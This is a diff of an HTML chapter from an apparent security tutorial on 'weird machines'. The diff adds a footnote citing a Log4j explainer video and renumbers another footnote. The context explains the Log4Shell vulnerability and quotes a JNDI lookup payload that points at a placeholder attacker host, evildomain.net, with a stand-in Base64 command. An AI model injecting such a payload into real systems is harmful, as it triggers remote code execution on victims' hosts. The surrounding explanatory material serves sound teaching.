@@ -387,7 +387,7 @@ In fact, Java's Log4J CVE-2021-44228<sup class="footnote-reference"><a href="#Lo
 <p>Many log sites in a codebase write external, attacker-controlled values directly into the logged string. A host's User Agent is one example, since it can be configured. Coupled with expansion/meta-programming, we lose a <strong>non-repudiation</strong> property - the attacker controls log message contents and can falsify data to cover their tracks.</p>
 </li>
 <li>
-<p>It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like <code>${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}</code> into a log, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.</p>
+<p>It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like <code>${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}</code> into a log<sup class="footnote-reference"><a href="#HutchinsLog4J">16</a></sup>, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.</p>
 </li>
 </ul>
 <p>In this example of command injection, the weird machine is programmed with a specially crafted string addressing an attacker-controlled server.
@@ -405,7 +405,7 @@ Those building blocks constitute a &quot;weird machine&quot;.
 When attackers write working exploits, they're, in essence, developing a new application for this inner machine.</p>
 <p>In the abstract game that is computer security, an attacker wins if they can successfully leverage any weird machine they discover.
 In practice, a defender cannot eliminate weird machines entirely.
-From an computability perspective, turing-completeness<sup class="footnote-reference"><a href="#TuringComplete">16</a></sup> gives the attacker a significant advantage.</p>
+From an computability perspective, turing-completeness<sup class="footnote-reference"><a href="#TuringComplete">17</a></sup> gives the attacker a significant advantage.</p>
 <p>Defenders strive to reduce and/or detect possible transitions out of the normal states and into the weird ones.
 Strongly-enforced memory and type-safety eliminate <em>a great deal</em> of possible transitions to malicious states.</p>
 <p>With that high-level conceptualization in mind, let's learn our way around a debugger and start dabbling in weird machine development ourselves.</p>
@@ -452,7 +452,7 @@ In the next section, we'll put these concepts into play hands-on to reduce secre
 <div class="footnote-definition" id="FormalWeirdness"><sup class="footnote-definition-label">13</sup>
 <p><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8226852"><em>Weird Machines, Exploitability, and Provable Unexploitability</em></a>. Thomas Dullien (2017).</p>
 </div>
-<div class="footnote-definition" id="TuringComplete"><sup class="footnote-definition-label">16</sup>
+<div class="footnote-definition" id="TuringComplete"><sup class="footnote-definition-label">17</sup>
 <p><a href="https://en.wikipedia.org/wiki/Turing_completeness"><em>Turing Completeness</em></a>. Wikipedia (Accessed 2022).</p>
 </div>
 <div class="footnote-definition" id="Log4J"><sup class="footnote-definition-label">14</sup>
@@ -460,6 +460,9 @@ In the next section, we'll put these concepts into play hands-on to reduce secre
 </div>
 <div class="footnote-definition" id="ComputerphileLog4J"><sup class="footnote-definition-label">15</sup>
 <p><a href="https://www.youtube.com/watch?v=Opqgwn8TdlM"><em>Log4J &amp; JNDI Exploit: Why So Bad?</em></a>. Computerphile (2021).</p>
+</div>
+<div class="footnote-definition" id="HutchinsLog4J"><sup class="footnote-definition-label">16</sup>
+<p><a href="https://www.youtube.com/watch?v=0-abhd-CLwQ"><em>Log4j (CVE-2021-44228) RCE Vulnerability Explained</em></a>. Marcus Hutchins (2021).</p>
 </div>
 
                     </main>
